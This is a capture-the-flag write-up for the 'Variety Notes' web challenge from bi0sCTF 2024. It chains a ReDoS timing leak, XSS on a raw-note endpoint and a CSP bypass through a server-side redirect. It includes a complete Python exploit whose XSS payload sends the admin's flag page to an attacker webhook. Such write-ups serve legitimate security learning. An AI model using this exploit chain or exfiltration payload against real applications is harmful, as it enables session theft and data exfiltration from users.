---
title: Variety Notes - bi0sCTF 2024
date: 2024-02-26 02:21:40
author: 
- Luc1f3r
- Lu513n
author_url: https://twitter.com/Adithyaraj2515
categories:
  - Web
tags:
  - bi0sCTF
  - ReDos
  - CSP bypass
---

**tl;dr**

+ Capturing the flag id through redos attack in /search endpoint
+ XSS in /uuid/noteid/raw and HTML injection in /uuid/noteid
+ CSP frame-src bypass through server side redirect

<!--more-->

**Challenge Points**: 1000
**No. of solves**: 1
**Challenge Author:** [Luc1f3r](https://twitter.com/Adithyaraj2515),[Lu513n](https://twitter.com/Lu513n)


## Challenge Description
So many notes challenges these days... Hope this one brings some variety into the mix.

## Analysis
The important endpoints are:

+ /create - This will create a note with content as given and save it in a text file with title-noteid as the name of the file.
+ /search - This will search for the note with the title from the directory. But this will only work for admin.
+ uuid/noteid/ - This will show the dom purified note.
+ uuid/noteid/raw - This will show the raw note.
+ uuid/noteid/share - This will create a shared note and redirect to /shared/sharednoteid which can be visible by anyone.


The initial finds from the source code:
1. /raw has XSS vulnerability.
2. uuid/noteid/ has html injection which also allows iframe(iframe is among the extra allowed tags).
3. default-src will only allow requests to url/session-id.

## Exploitation
The challenge can be exploited in 2 parts.

### 1 - XSS in Admin bot
In this challenge the admin bot functions a bit differently. In the report endpoint you can give title and content of a note which will be created by the bot. After that the bot will visit this note.

Here the content of the note is sanitized using Dom purify. But iframe is given as one of the allowed tags. So using iframe we can possibly get XSS. If we load a note which has XSS payload in the iframe as the admin's note

`<iframe src="./../uuid/noteid/raw"></iframe>` 

Then we can get XSS. But this won't work as the CSP is set as

```js
app.use((req, res, next) => {
  res.setHeader(
    "Content-Security-Policy",
    `
    default-src ${
      req.session && req.session.user
        ? appURL + req.session.user + "/"
        : "'none'"
    };
    script-src 'unsafe-inline' 'self';
    object-src 'none';
    base-uri 'none';
    connect-src 'none' ;
    navigate-to 'self';
    `
      .trim()
      .replace(/\s+/g, " ")
  );
  ```

So uuid other than the admin itself is not allowed and you can't get the /raw of an admin note.

There is an exception in CSP.
> The matching algorithm ignores the path component of a source expression if the resource being loaded is the result of a redirect

^ [w3.org](https://www.w3.org/TR/CSP3/#source-list-paths-and-redirects)
That is if an allowed path has a server side redirect to an unallowed path the CSP will not be violated as long as the domain is allowed by the CSP.
Here is where the /share endpoint comes into play. uuid/noteid/share will look for a note with the given noteid and add it to the shared object and redirect to shared/sharednoteid where anyone can see the shared note.
In this endpoint the sharednoteid will be the noteid we give and the endpoint redirects whether the note exists or not.
If we give the path as `uuid/..%2fanotheruuid%2fnoteid%2fraw/share` then it will be like `shared/../anotheruuid/noteid/raw` and will load `anotheruuid/noteid/raw`.
So now we can get XSS in admin side. But how do we get the flag which is in a different note.

### 2 - Flag noteid through ReDos

/search endpoint searched for notes from admin's directory but it only allows admin to search. Or does it?
```js
  try {
    if (!checkTitle(searchTitle)) {
      return res.send("Invalid title");
    }
    if (userId !== adminUUID) {
      return res.send("Only admin can search for notes");
    }
  } catch (err) {
    return res.redirect(`/${userId}`);
  } finally {
    const notes = await filehound
      .create()
      .paths(`./notes/${adminUUID}`)
      .match(`*${searchTitle}*-*.txt`)
      .ext("txt")
      .find();
    return res.render("search", { data: { ...notes, id: userId } });
  }
});
```
Here whether admin or not the searching will happen because it is in finally block. It will return whatever is given in try and catch but the connection will only close after the finally block is executed. So we can get the flag noteid using time difference by doing ReDos. 

## Final Exploit
Now we have the flag noteid and XSS in admin bot. So the flag can be acquired by reporting the note content as:

```html
<iframe src="./flagid"></iframe>
<iframe src="./../%2fuuid%2fxssnoteid%2fraw/share"></iframe>
```

The full exploit is:
```js
import requests
from pwn import *
import time

url = "http://34.18.37.24:10505"
hook_url = "{webhook_url}"

s = requests.Session()


def convert_to_raw(preapred):
    return (
        preapred.method
        + " "
        + preapred.path_url
        + " HTTP/1.1\r\n"
        + "Host: 34.18.37.24:10505\r\n"
        + "\r\n".join([f"{k}: {v}" for k, v in preapred.headers.items()])
        + "\r\n\r\n"
        + preapred.body
    )


header = {"Authorization": "Basic YWM0NzUxYTEzYjEwZDU5NTplYjNiNzMwNmFlYjM0NzVk"}


def create_xss_note():
    payload = f"""
    <script>
    (async () => {{
    const w = window.open("","flag");
    await new Promise(r => setTimeout(r, 2000));
    open("{hook_url}?f="+encodeURIComponent(w.document.body.innerHTML));
    }})();
    </script>
    """
    r = s.post(
        url + "/create",
        data={"title": "xss", "note": payload},
        allow_redirects=False,
        headers=header,
    )
    print(r.text)
    r = r.headers.get("Location")
    return r


s.post(
    url + "/register", data={"username": "random", "password": "random"}, headers=header
)
s.post(
    url + "/login", data={"username": "random", "password": "random"}, headers=header
)

XSS_NOTE = create_xss_note()
known = ""
for i in range(8):
    k = 1
    while len(known) <= i:
        for j in "abcdefghijklmnopqrstuvwxyz0123456789":
            search = f"Flag-{known+j}******************"+i * i * "*" + k * k * "*"
            r = requests.Request(
                "POST",
                url + "/search",
                cookies=s.cookies.get_dict(),
                data={
                    "searchTitle": (
                        search
                    )
                },
                headers=header,
            ).prepare()

            io = remote("34.18.37.24", 10505)
            print("length:- ",len(search)-5)
            raw_request = convert_to_raw(r)
            io.send(raw_request.encode())
            io.recv(1024)
            t1 = time.time()
            io.recvall()
            t2 = time.time()
            print(i, known + j)
            if t2 - t1 > 2:
                known += j
                print("the key ",i, known)
                break
            io.close()
        k += 2
print(known)

print(XSS_NOTE)

payload = f"""<iframe id='flag' name="flag" src="./{known}" ></iframe>
<iframe src="./..{XSS_NOTE.replace("/","%2f")}%2fraw/share" ></iframe>"""

print(payload)

print(
    s.post(url + "/report", data={"title": "xss", "note": payload}, headers=header).text
)
```